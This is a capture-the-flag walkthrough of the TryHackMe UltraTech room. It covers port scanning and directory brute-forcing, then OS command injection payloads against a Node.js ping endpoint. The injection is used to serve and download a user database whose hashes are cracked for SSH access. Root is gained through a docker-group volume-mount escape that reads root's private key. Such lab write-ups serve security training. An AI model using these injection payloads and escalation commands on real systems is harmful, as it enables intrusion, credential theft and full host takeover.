# TryHackMe: UltraTech

[UltraTech](https://tryhackme.com/room/ultratech1) is ranked as a medium room but feels pretty easy. The room focuses on basic enumeration, webapp testing and privilege escalation.

So, let's begin!

## Initial Enumeration

The first thing that we can do after starting the machine is try to access the IP address through our browser to check if some website is hosted on port 80 or 443 but in this case we are not able to connect over port 80/443. This suggests that there are high chances of port 80/443 being closed.

The next thing that we can do in our initial enumeration is to run a basic `nmap` scans on the provided IP address. Considering we want to scan all the port, we can first run a `TCP SYN` scan to get a list of all the open ports and then run an in-depth scan focusing only on the open ports. 

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sudo nmap -p- -sS 10.10.49.27 | tee open_ports
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 10:45 EDT
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.51% done; ETC: 10:56 (0:10:17 remaining)
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.47% done; ETC: 10:59 (0:10:58 remaining)
Nmap scan report for 10.10.49.27
Host is up (0.15s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1078.39 seconds
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sudo nmap -sV -sC -A -O -T4 -p21,22,8081,31331 10.10.49.27 | tee service_scan
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 11:15 EDT
Nmap scan report for 10.10.49.27
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   163.70 ms 10.8.0.1
2   164.16 ms 10.10.49.27

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.91 seconds

```

From these results, we can see that node.js is running on port 8081 and Apache web server is running on port 31331. We can access and check both of them on our browser.

The page on port 8081 looks like:

![image-20210424081456203](./.images/8081.png)

And on port 31331, we can see a webpage:

![31331](./.images/31331.png)

Now, we can proceed with performing directory traversal attack on both these port:

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ dirb http://10.10.49.27:8081                                                                         

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr 23 22:26:14 2021
URL_BASE: http://10.10.49.27:8081/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.49.27:8081/ ----
+ http://10.10.49.27:8081/auth (CODE:200|SIZE:39)                                                                    
+ http://10.10.49.27:8081/ping (CODE:500|SIZE:1094)                                                                  
                                                                                                                     
-----------------
END_TIME: Fri Apr 23 22:40:31 2021
DOWNLOADED: 4612 - FOUND: 2

```

From the above result, it can be seen that there are 2 file paths that were detected by `dirb` on port 8081.

And for port 31331, we get the following results:

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ ffuf -u http://10.10.187.174:31337/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.187.174:31331/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Copyright 2007 James Fisher [Status: 200, Size: 6092, Words: 393, Lines: 140]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140]
# on atleast 2 different hosts [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6092, Words: 393, Lines: 140]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 6092, Words: 393, Lines: 140]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 6092, Words: 393, Lines: 140]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
# This work is licensed under the Creative Commons  [Status: 200, Size: 6092, Words: 393, Lines: 140]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]
:: Progress: [220560/220560] :: Job [1/1] :: 236 req/sec :: Duration: [0:22:27] :: Errors: 0 ::
```

We can check out each of the detected paths and find that there are some interesting files in the `js` directory.

![JS_directory](./.images/js.png)

On checking the `api.js` file, we can find some really interesting information.

![api_js](./.images/api_js.png)

From the JS file, it can be inferred that is request is being sent towards: `http://${getAPIURL()}/ping?ip=${window.location.hostname}` where the function `${getAPIURL()}` returns `${window.location.hostname}:8081` which is nothing but the domain name of the web host. In our case, we can try the IP address of the machine itself.

![ping_machine](./.images/ping_machine.png)

>  The normal output does not get displayed properly so using `view-source` appears to be more visually friendly. 

## Initial Foothold

We can see that the `ping` command is being run in the background. So, we can try to perform OS Command Injection over here. 

```bash
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93;ls # Does not work
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|ls # Does not work
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|`ls` # Works but only one word gets printed in the output
```

From the one word output also, we can see that the name of a `.sqlite` field is being returned.

![OS command injection](./.images/os_injection_ls.png)

We know that the commands are getting executed on the machine but its just that we are not able to see the proper output. So, we can try to download the `.sqlite` file to check its content by perform the following steps:

1. Check if `python` is installed on the machine by sending the command `which python` in place of `ls` in the URL:

   ![which python](./.images/which_python.png)

   Here, it can be seen `/usr/bin/python` is present on the machine. 

2. So, we can start a python server by sending the command `python -m SimpleHTTPServer` after which the page just keeps loading, suggesting the command was executed successful. 

3. Now, we can use `wget` on our local machine to download the `.sqlite` file from the target machine:

   ```
   ┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
   └─$ wget http://10.10.193.93:8000/utech.db.sqlite
   --2021-04-23 12:09:45--  http://10.10.193.93:8000/utech.db.sqlite
   Connecting to 10.10.193.93:8000... connected.
   HTTP request sent, awaiting response... 200 OK
   Length: 8192 (8.0K) [application/octet-stream]
   Saving to: ‘utech.db.sqlite’
   
   utech.db.sqlite                 0%[                                               ]       0  --.-KB/s  utech.db.sqlite                44%[===================>                           ]   3.55K  10.4KB/s  utech.db.sqlite               100%[==============================================>]   8.00K  12.2KB/s  utech.db.sqlite               100%[==============================================>]   8.00K  12.2KB/s    in 0.7s    
   
   2021-04-23 12:09:46 (12.2 KB/s) - ‘utech.db.sqlite’ saved [8192/8192]
   
   ```

   > There was some guess work here. Normally python server starts on port 8000 that's why I used 8000 but incase if this command would've not got executed successfully then we could've tried port 8080 or we could've passed our own specific port.

As we have the `.sqlite` file we can open it using the `sqlite3` command and check the data stored in it.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sqlite3 utech.db.sqlite 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .database
main: /home/kali/Desktop/oscp/ultraTech/utech.db.sqlite r/w
sqlite> .tables
users
sqlite> select * from users
   ...> ;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

From the `.sqlite` file, we were able to obtain hashes for two users. We can try to crack them at [crackstation](https://crackstation.net/) and get the password for both the accounts.

Now, that we have a pair of username and password, and knowing that port 22 is open on the machine. We can quickly try to SSH into the machine:

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$                                                                                                     ssh r00t@10.10.187.174 
The authenticity of host '10.10.187.174 (10.10.187.174)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.187.174' (ECDSA) to the list of known hosts.
r00t@10.10.187.174's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 23 16:15:12 UTC 2021

  System load:  0.16               Processes:           105
  Usage of /:   24.4% of 19.56GB   Users logged in:     0
  Memory usage: 72%                IP address for eth0: 10.10.187.174
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```

And it can be seen that with the credentials of user "r00t" we can get access to the machine. Also, from the output of `sudo -l` it is very clear that we can't run any commands with `sudo` privilege. So, the next thing we can do is perform further enumeration to find any possible vector through which we can escalate our privilege to `root`.

## Privilege Escalation

We can run some basic commands to gain information about the system and the current user:

```bash
r00t@ultratech-prod:~$ whoami
r00t
r00t@ultratech-prod:~$ uname -a
Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
r00t@ultratech-prod:~$ cat /proc/version
Linux version 4.15.0-46-generic (buildd@lgw01-amd64-038) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

And here we get our potential vector for performing privilege escalation i.e. the user's presence in the "docker" group. We can use this to escalate our privileges to `root` which just one simple command:

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
# cd root
# cd .ssh
# ls -la
total 16
drwx------ 2 root root 4096 Mar 22  2019 .
drwx------ 6 root root 4096 Mar 22  2019 ..
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
```

So, basically the `docker` command can be broken down as:

| Term/Switch        | Meaning                                                      |
| ------------------ | ------------------------------------------------------------ |
| `docker`           | Running the docker command                                   |
| `run`              | Run the container                                            |
| `-v`               | Specifying the volume                                        |
| `/:/mnt`           | Mount the root directory (`/`) at `/mnt`                     |
| `--rm`             | Remove the container after exit                              |
| --it               | Interactive                                                  |
| `bash chroot /mnt` | `bash` is being used to run the `chroot` command which change the effective root directory to `/mnt` |
| `sh`               | Start a `sh` shell                                           |

And with this we have rooted the UltraTech machine!

## Alternative Method

A better way to perform OS Command Injection could be done by using the keyword `%0a` (newline):

```
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93 %0a ls -la
```

Which would have resulted in an output like:

![0a_command_injection](./.images/0a_command_injection.png)

## Resources

1. TryHackMe - UltraTech: https://tryhackme.com/room/ultratech1
2. A Pentester's Guide to Command Injection by Busra Demir: https://blog.cobalt.io/a-pentesters-guide-to-command-injection-df2657c8c1ad
3. Docker Privilege Escalation: https://keiran.scot/privilege-escallation-with-docker-56dc682a6e17